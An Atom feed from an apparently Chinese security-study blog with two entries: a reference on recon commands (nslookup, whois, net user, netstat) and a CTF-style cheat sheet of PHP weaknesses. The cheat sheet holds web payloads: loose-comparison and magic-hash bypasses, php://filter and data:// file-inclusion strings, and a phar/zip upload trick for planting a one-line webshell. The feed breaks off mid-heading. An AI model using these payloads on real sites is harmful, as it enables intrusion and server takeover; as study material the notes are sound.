<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>嶽General</title>
  
  <subtitle>越努力,越幸运</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/hjyApple/hjyApple.github.io/"/>
  <updated>2018-08-04T08:44:40.613Z</updated>
  <id>https://github.com/hjyApple/hjyApple.github.io/</id>
  
  <author>
    <name>HJY&#39;s Blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>信息收集之命令行的使用</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/08/01/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/08/01/信息收集之命令行的使用/</id>
    <published>2018-08-01T08:07:38.000Z</published>
    <updated>2018-08-04T08:44:40.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>nslookup命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。<br><code>nslookup baidu.com</code></p><p>只要在查询的时候，加上-d参数，即可查询域名的缓存。<br>nslookup -qt=type domain [dns-server]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">type可以是以下这些类型：</span><br><span class="line"></span><br><span class="line">A 地址记录</span><br><span class="line">AAAA 地址记录</span><br><span class="line">AFSDB Andrew文件系统数据库服务器记录</span><br><span class="line">ATMA ATM地址记录</span><br><span class="line">CNAME 别名记录</span><br><span class="line">HINFO 硬件配置记录，包括CPU、操作系统信息</span><br><span class="line">ISDN 域名对应的ISDN号码</span><br><span class="line">MB 存放指定邮箱的服务器</span><br><span class="line">MG 邮件组记录</span><br><span class="line">MINFO 邮件组和邮箱的信息记录</span><br><span class="line">MR 改名的邮箱记录</span><br><span class="line">MX 邮件服务器记录</span><br><span class="line">NS 名字服务器记录</span><br><span class="line">PTR 反向记录</span><br><span class="line">RP 负责人记录</span><br><span class="line">RT 路由穿透记录</span><br><span class="line">SRV TCP服务器信息记录</span><br><span class="line">TXT 域名对应的文本信息</span><br><span class="line">X25 域名对应的X.25地址记录</span><br><span class="line">例：nslookup -qt=mx baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure></p><h3 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h3><p>Linux下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami；显示的是当前用户下的用户名</span><br><span class="line">who am i：显示的是登录时的用户名</span><br><span class="line">who：显示当前真正登录系统中的用户（不会显示那些用su命令切换用户的登录者）</span><br></pre></td></tr></table></figure></p><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>用来查找并显示指定用户账号、域名相关信息，包括域名注册时间、拥有者、邮箱等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">可选参数</span><br><span class="line">-a  搜寻所有数据库</span><br><span class="line">-c  找到最小的包含一个 mnt-irt 属性的匹配</span><br><span class="line">-d  同时返回 DNS 反向查询的代理对象(需支持RPSL协议)</span><br><span class="line">-F  快速输出原始数据</span><br><span class="line">-H  隐藏法律声明内容</span><br><span class="line">-i ATTR 进行一次反向查询</span><br><span class="line">-l  将精确度降低一级的查询 (需支持RPSL协议)</span><br><span class="line">-L  找到所有低精确度匹配</span><br><span class="line">-m  找到第一级较高精确度匹配</span><br><span class="line">-M  找到所有较高精确度匹配</span><br><span class="line">-r  查询联系信息时关闭递归查询</span><br><span class="line">-R  显示本地域名对象副本</span><br><span class="line">-x  精确匹配</span><br><span class="line">-h[主机]  连接到指定 HOST 服务器</span><br><span class="line">-p[端口] 连接到指定 PORT 端口</span><br><span class="line">-t[类型]  查询指定类型对象头信息</span><br><span class="line">-T[类型]  查找指定类型的对象</span><br><span class="line">-v[类型]  查询指定类型对象冗余信息</span><br><span class="line">-q [版本|类型] 查询特定的服务器信息(需支持RPSL协议)</span><br><span class="line">更多参数可以使用man whois 查询</span><br></pre></td></tr></table></figure></p><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。或者进行用户管理和登陆管理等。     </p><h4 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h4><p>连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NET USE</span><br><span class="line">:[domainname\]username]</span><br><span class="line">        [/USER:[dotted domain name\]username]</span><br><span class="line">        [/USER:[username@dotted domain name]</span><br><span class="line">        [/SMARTCARD]</span><br><span class="line">        [/SAVECRED]</span><br><span class="line">        [/REQUIREINTEGRITY]</span><br></pre></td></tr></table></figure></p><h4 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h4><p>添加或更改用户账号或显示用户账号信息<br>此命令的语法是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> net user /?</span><br><span class="line"></span><br><span class="line">NET USER</span><br><span class="line">[username [password | *] [options]] [/DOMAIN]</span><br><span class="line">         username &#123;password | *&#125; /ADD [options] [/DOMAIN]</span><br><span class="line">         username [/DELETE] [/DOMAIN]</span><br><span class="line">         username [/TIMES:&#123;times | ALL&#125;]</span><br><span class="line">         username [/ACTIVE: &#123;YES | NO&#125;]</span><br><span class="line">         </span><br><span class="line">查看指定用户信息：net user Administrator</span><br><span class="line">添加一个用户：net user username password /add /fullname：&quot;全名&quot;   </span><br><span class="line">修改指定用户密码：net user username NewPassword</span><br><span class="line">禁用指定用户：net user username /active:no</span><br><span class="line">启用指定用户：net user username /active:yes</span><br></pre></td></tr></table></figure></p><h4 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h4><p>创建、删除或显示共享资源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">NET SHARE</span><br><span class="line">sharename</span><br><span class="line">          sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]]</span><br><span class="line">                               [/USERS:number | /UNLIMITED]</span><br><span class="line">                               [/REMARK:&quot;text&quot;]</span><br><span class="line">                               [/CACHE:Manual | Documents| Programs | BranchCache | None]</span><br><span class="line">          sharename [/USERS:number | /UNLIMITED]</span><br><span class="line">                    [/REMARK:&quot;text&quot;]</span><br><span class="line">                    [/CACHE:Manual | Documents | Programs | BranchCache | None]</span><br><span class="line">          &#123;sharename | devicename | drive:path&#125; /DELETE</span><br><span class="line">          sharename \\computername /DELETE</span><br></pre></td></tr></table></figure></p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>用于列出系统上所有的网络套接字连接情况，包括tcp，udp<br>参数使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval]</span><br><span class="line"></span><br><span class="line">  -a            显示所有连接和侦听端口。</span><br><span class="line">  -b            显示在创建每个连接或侦听端口时涉及的</span><br><span class="line">                可执行程序。在某些情况下，已知可执行程序承载</span><br><span class="line">                多个独立的组件，这些情况下，</span><br><span class="line">                显示创建连接或侦听端口时</span><br><span class="line">                涉及的组件序列。在此情况下，可执行程序的</span><br><span class="line">                名称位于底部 [] 中，它调用的组件位于顶部，</span><br><span class="line">                直至达到 TCP/IP。注意，此选项</span><br><span class="line">                可能很耗时，并且在你没有足够</span><br><span class="line">                权限时可能失败。</span><br><span class="line">  -e            显示以太网统计信息。此选项可以与 -s 选项</span><br><span class="line">                结合使用。</span><br><span class="line">  -f            显示外部地址的完全限定</span><br><span class="line">                域名(FQDN)。</span><br><span class="line">  -n            以数字形式显示地址和端口号。</span><br><span class="line">  -o            显示拥有的与每个连接关联的进程 ID。</span><br><span class="line">  -p proto      显示 proto 指定的协议的连接；proto</span><br><span class="line">                可以是下列任何一个: TCP、UDP、TCPv6 或 UDPv6。如果与 -s</span><br><span class="line">                选项一起用来显示每个协议的统计信息，proto 可以是下列任何一个:</span><br><span class="line">                IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 或 UDPv6。</span><br><span class="line">  -q            显示所有连接、侦听端口和绑定的</span><br><span class="line">                非侦听 TCP 端口。绑定的非侦听端口</span><br><span class="line">                 不一定与活动连接相关联。</span><br><span class="line">  -r            显示路由表。</span><br><span class="line">  -s            显示每个协议的统计信息。默认情况下，</span><br><span class="line">                显示 IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6 的统计信息;</span><br><span class="line">                -p 选项可用于指定默认的子网。</span><br><span class="line">  -t            显示当前连接卸载状态。</span><br><span class="line">  -x            显示 NetworkDirect 连接、侦听器和共享</span><br><span class="line">                终结点。</span><br><span class="line">  -y            显示所有连接的 TCP 连接模板。</span><br><span class="line">                无法与其他选项结合使用。</span><br><span class="line">  interval      重新显示选定的统计信息，各个显示间暂停的</span><br><span class="line">                间隔秒数。按 CTRL+C 停止重新显示</span><br><span class="line">                统计信息。如果省略，则 netstat 将打印当前的</span><br><span class="line">                配置信息一次。</span><br></pre></td></tr></table></figure></p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>用来测试网络连通性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参数如下：</span><br><span class="line">输入ping /? ，列出ping的相关参数</span><br><span class="line"></span><br><span class="line">-c  用来指定ping的回应次数</span><br><span class="line">-t ：Ping 指定的计算机直到中断。</span><br><span class="line">-a ：将地址解析为计算机名。</span><br><span class="line">-n count ：发送 count 指定的 ECHO 数据包数。默认值为 4。</span><br><span class="line">-l size ：发送包含由 size 指定的数据量的 ECHO 数据包。默认为 32 字节；最大值是65,527。</span><br><span class="line">-f ：在数据包中发送&quot;不要分段&quot;标志。数据包就不会被路由上的网关分段。</span><br><span class="line">-i ttl :将&quot;生存时间&quot;字段设置为 ttl 指定的值。</span><br><span class="line">-v tos :将&quot;服务类型&quot;字段设置为 tos 指定的值。</span><br><span class="line">-r count :在&quot;记录路由&quot;字段中记录传出和返回数据包的路由。count 可以指定最少 1 台，最多 9 台计算机。</span><br><span class="line">-s count :指定 count 指定的跃点数的时间戳。</span><br><span class="line">-j host-list :利用 host-list 指定的计算机列表路由数据包。连续计算机可以被中间网关分隔（路由稀疏源）IP 允许的最大数量为 9。</span><br><span class="line">-k host-list :利用 host-list 指定的计算机列表路由数据包。连续计算机不能被中间网关分隔（路由严格源）IP 允许的最大数量为 9。</span><br><span class="line">-w timeout :指定超时间隔，单位为毫秒。</span><br><span class="line">destination-list :指定要 ping 的远程计算机。</span><br></pre></td></tr></table></figure></p><h3 id="tracert-windows下-traceroute-unix-amp-linux"><a href="#tracert-windows下-traceroute-unix-amp-linux" class="headerlink" title="tracert(windows下) || traceroute(unix&amp;linux)"></a>tracert(windows下) || traceroute(unix&amp;linux)</h3><p>用于探测数据包从源到目的经过路由的IP,分析网络拓扑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用法: tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout]</span><br><span class="line">               [-R] [-S srcaddr] [-4] [-6] target_name</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">    -d                 不将地址解析成主机名。</span><br><span class="line">    -h maximum_hops    搜索目标的最大跃点数。</span><br><span class="line">    -j host-list       与主机列表一起的松散源路由(仅适用于 IPv4)。</span><br><span class="line">    -w timeout         等待每个回复的超时时间(以毫秒为单位)。</span><br><span class="line">    -R                 跟踪往返行程路径(仅适用于 IPv6)。</span><br><span class="line">    -S srcaddr         要使用的源地址(仅适用于 IPv6)。</span><br><span class="line">    -4                 强制使用 IPv4。</span><br><span class="line">    -6                 强制使用 IPv6。</span><br></pre></td></tr></table></figure></p><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">用法:</span><br><span class="line">    ipconfig [/allcompartments] [/? | /all |</span><br><span class="line">                                 /renew [adapter] | /release [adapter] |</span><br><span class="line">                                 /renew6 [adapter] | /release6 [adapter] |</span><br><span class="line">                                 /flushdns | /displaydns | /registerdns |</span><br><span class="line">                                 /showclassid adapter |</span><br><span class="line">                                 /setclassid adapter [classid] |</span><br><span class="line">                                 /showclassid6 adapter |</span><br><span class="line">                                 /setclassid6 adapter [classid] ]</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">    adapter             连接名称</span><br><span class="line">                       (允许使用通配符 * 和 ?，参见示例)</span><br><span class="line"></span><br><span class="line">    选项:</span><br><span class="line">       /?               显示此帮助消息</span><br><span class="line">       /all             显示完整配置信息。</span><br><span class="line">       /release         释放指定适配器的 IPv4 地址。</span><br><span class="line">       /release6        释放指定适配器的 IPv6 地址。</span><br><span class="line">       /renew           更新指定适配器的 IPv4 地址。</span><br><span class="line">       /renew6          更新指定适配器的 IPv6 地址。</span><br><span class="line">       /flushdns        清除 DNS 解析程序缓存。</span><br><span class="line">       /registerdns     刷新所有 DHCP 租用并重新注册 DNS 名称</span><br><span class="line">       /displaydns      显示 DNS 解析程序缓存的内容。</span><br><span class="line">       /showclassid     显示适配器允许的所有 DHCP 类 ID。</span><br><span class="line">       /setclassid      修改 DHCP 类 ID。</span><br><span class="line">       /showclassid6    显示适配器允许的所有 IPv6 DHCP 类 ID。</span><br><span class="line">       /setclassid6     修改 IPv6 DHCP 类 ID。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">默认情况下，仅显示绑定到 TCP/IP 的每个适配器的 IP 地址、子网掩码和</span><br><span class="line">默认网关。</span><br><span class="line"></span><br><span class="line">对于 Release 和 Renew，如果未指定适配器名称，则会释放或更新所有绑定</span><br><span class="line">到 TCP/IP 的适配器的 IP 地址租用。</span><br><span class="line"></span><br><span class="line">对于 Setclassid 和 Setclassid6，如果未指定 ClassId，则会删除 ClassId。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">    &gt; ipconfig                       ... 显示信息</span><br><span class="line">    &gt; ipconfig /all                  ... 显示详细信息</span><br><span class="line">    &gt; ipconfig /renew                ... 更新所有适配器</span><br><span class="line">    &gt; ipconfig /renew EL*            ... 更新所有名称以 EL 开头</span><br><span class="line">                                         的连接</span><br><span class="line">    &gt; ipconfig /release *Con*        ... 释放所有匹配的连接，</span><br><span class="line">                                         例如“有线以太网连接 1”或</span><br><span class="line">                                             “有线以太网连接 2”</span><br><span class="line">    &gt; ipconfig /allcompartments      ... 显示有关所有隔离舱的</span><br><span class="line">                                         信息</span><br><span class="line">    &gt; ipconfig /allcompartments /all ... 显示有关所有隔离舱的</span><br><span class="line">                                         详细信息</span><br><span class="line"></span><br><span class="line">在排查DNS故障时，经常使用该命令  ipconfig /flushdns来清除dns缓存</span><br></pre></td></tr></table></figure><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tasklist -- 显示运行的所有进程</span><br><span class="line">ver -- 显示系统版本号</span><br><span class="line">ipconfig -- 显示当前 TCP/IP 网络配置</span><br><span class="line">systeminfo -- 显示关于计算机及其操作系统的详细配置信息</span><br><span class="line">netstat -- 显示网络连接、路由表和网络接口信息</span><br><span class="line">qprocess -- 显示 RD 会话主机服务器上正在运行的进程的相关信息</span><br><span class="line">query -- 显示进程、会话和 RD 会话主机服务器的相关信息</span><br><span class="line">type -- 显示文本文件的内容</span><br><span class="line">at -- 计划任务</span><br><span class="line">reg -- 注册表操作</span><br><span class="line">wmic -- 提供了从命令行接口和批命令脚本执行系统管理的支持</span><br><span class="line">wusa -- 安装补丁</span><br><span class="line">netsh advfirewall -- 管理防火墙</span><br><span class="line">sc -- 用来和NT服务控制器和服务进行通讯的命令行程序</span><br><span class="line">rundll32 -- 调用动态链接程序库</span><br></pre></td></tr></table></figure><p><a href="http://www.nicky1605.net/102.html" target="_blank" rel="noopener">net命令详解参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;nslookup&quot;&gt;&lt;a href=&quot;#nslookup&quot; class=&quot;headerlink&quot; title=&quot;nslookup&quot;&gt;&lt;/a&gt;nslookup&lt;/h3&gt;&lt;p&gt;nslookup命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>PHP函数漏洞集</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/06/08/PHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E9%9B%86/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/06/08/PHP函数漏洞集/</id>
    <published>2018-06-08T08:45:43.000Z</published>
    <updated>2018-07-08T08:47:15.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>preg_match<br>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过</span><br><span class="line">if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) &#123;</span><br><span class="line">  die(&apos;error&apos;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // echo(&apos;key...&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ereg %00 截断<br>ereg 读到 %00 的时候，就截止了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&apos;a&apos;]) === FALSE)  &#123;</span><br><span class="line">        echo &apos;You password must be alphabet&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p> a=abcd%001234，可以绕过<br><code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE</code><br>字符串对比解析<br>在这里如果 $_GET[‘password’]为数组，则返回值为NULL<br>如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true<br>其余为false</p><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    echo 0 == &apos;a&apos; ;// a 转换为数字为 0    重点注意</span><br><span class="line">    // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span><br><span class="line">    // 十六进制与整数，被转换为同一进制比较</span><br><span class="line">    &apos;0xccccccccc&apos; == &apos;54975581388&apos; ;</span><br><span class="line"></span><br><span class="line">    // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span><br><span class="line">    1 == &apos;1&apos;;</span><br><span class="line">    1 == &apos;01&apos;;</span><br><span class="line">    10 == &apos;1e1&apos;;</span><br><span class="line">    &apos;100&apos; == &apos;1e2&apos; ;    </span><br><span class="line"></span><br><span class="line">    // 十六进制数与带空格十六进制数，被转换为十六进制整数</span><br><span class="line">    &apos;0xABCdef&apos;  == &apos;     0xABCdef&apos;;</span><br><span class="line">    echo &apos;0010e2&apos; == &apos;1e3&apos;;</span><br><span class="line">    // 0e 开头会被当成数字，又是等于 0*10^xxx=0</span><br><span class="line">    // 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</span><br><span class="line">    &apos;0e509367213418206700842008763514&apos; == &apos;0e481036490867661113260034900752&apos;;</span><br><span class="line">    &apos;0e481036490867661113260034900752&apos; == &apos;0&apos; ;</span><br><span class="line"></span><br><span class="line">    var_dump(md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;));</span><br><span class="line">    var_dump(md5(&apos;aabg7XSs&apos;) == md5(&apos;aabC9RqS&apos;));</span><br><span class="line">    var_dump(sha1(&apos;aaroZmOk&apos;) == sha1(&apos;aaK1STfY&apos;));</span><br><span class="line">    var_dump(sha1(&apos;aaO8zKZF&apos;) == sha1(&apos;aa3OFF9m&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?page=upload</span><br><span class="line">这种 url 很容易就能想到可能是文件包含或者伪协议读取</span><br><span class="line">http://127.0.0.1/index.php?page=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>写入文件， 数据利用 POST 传过去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://input</span><br></pre></td></tr></table></figure></p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>将 include 的文件流重定向到用户控制的输入流<br><code>test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</code><br>可以用于控制 file_get_contents 的内容为用户输入的流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。<br>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含<br>这里的路径为上传的 jpg 文件在服务器的路径<br><code>/index.php?id=phar://路径/xxx.jpg/shell</code></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>上述 phar:// 的方法也可以使用 zip://<br>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。<br>1.zip文件内仅有1.php这个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/php?file=zip://1.png%231.php  </span><br><span class="line">// 也可以尝试不改名为png，直接使用zip上传测试一下</span><br><span class="line">/php?file=zip://1.zip%231.php</span><br></pre></td></tr></table></figure></p><h3 id="MD5-compare漏洞"><a href="#MD5-compare漏洞" class="headerlink" title="MD5 compare漏洞"></a>MD5 